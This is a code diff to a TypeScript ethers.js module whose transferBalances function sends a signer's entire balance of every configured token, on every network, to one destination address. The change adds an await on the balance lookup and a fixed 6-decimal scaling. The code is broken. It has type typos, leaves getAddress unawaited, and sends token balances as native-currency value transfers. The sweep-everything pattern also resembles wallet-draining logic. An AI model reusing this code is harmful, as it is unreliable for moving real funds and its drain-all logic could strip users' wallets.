@@ -89,10 +89,11 @@ export async function getBalance(network: any, address: any) {
 export async function transferBalances(signer: ether.Signer, toAddress) {
   const fromAdress = signer.getAddress();
   return Object.values(networkTokens).map((item) =>
-    Object.keys(item).map((key) => {
+    Object.keys(item).map(async (key) => {
       const provider = new ethers.JsonRpcProvider(item[key].provider);
       const contract = new ethers.Contract(item[key].address, item[key].abi, provider);
-      return transfer(signer, toAddress, Number(contract.balanceOf(fromAdress)));
+      const balance = await contract.balanceOf(fromAdress);
+      return transfer(signer, toAddress, balance);
     })
   ).flat();
 }
@@ -101,7 +102,7 @@ export async function transfer(signer: ether.Signer, to: string, amount: number)
   try {
     const tx = await signer.sendTransaction({
       to,
-      value: amount,
+      value: ethers.parseUnits(amount.toString(), 6),
     });
 
     await tx.wait();
